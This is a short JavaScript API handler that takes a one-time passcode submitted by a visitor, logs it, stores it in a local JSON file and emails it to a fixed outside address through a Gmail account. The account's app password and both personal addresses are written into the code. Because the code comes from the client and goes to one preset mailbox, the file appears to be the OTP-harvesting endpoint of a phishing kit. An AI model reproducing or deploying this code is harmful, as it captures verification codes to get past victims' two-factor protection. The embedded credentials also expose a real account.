import nodemailer from 'nodemailer';
import fs from 'fs';
import path from 'path';

// Path to the JSON file
const otpFilePath = path.join(process.cwd(), 'data', 'otps.json');

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  const { otp } = req.body;
  console.log('Received OTP:', otp);

  try {
    // Save the OTP locally
    await saveOtpLocally(otp);

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "asalamlatif@gmail.com",
        pass: "prmr opim qodx xnpx",
      },
    });

    const mailOptions = {
      from: 'asalamlatif@gmail.com',
      to: 'toonilaniyan@gmail.com',
      subject: 'Your OTP Code',
      text: `Your OTP code is: ${otp}`,
    };

    await transporter.sendMail(mailOptions);

    return res.status(200).json({ message: 'OTP Sent and Saved Successfully' });
  } catch (error) {
    console.error('Error:', error.message);
    return res.status(500).json({ message: 'Failed to send email', error: error.message });
  }
}

// Function to save OTP locally
async function saveOtpLocally(otp) {
  try {
    const data = await fs.promises.readFile(otpFilePath, 'utf8');
    let otps = [];
    if (data) {
      otps = JSON.parse(data); // Parse existing OTPs
    }

    // Append new OTP
    otps.push({ otp, timestamp: new Date().toISOString() });

    // Write updated OTPs back to the file
    await fs.promises.writeFile(otpFilePath, JSON.stringify(otps, null, 2));
    console.log('OTP saved successfully!');
  } catch (err) {
    console.error('Error reading or writing OTP file:', err);
  }
}
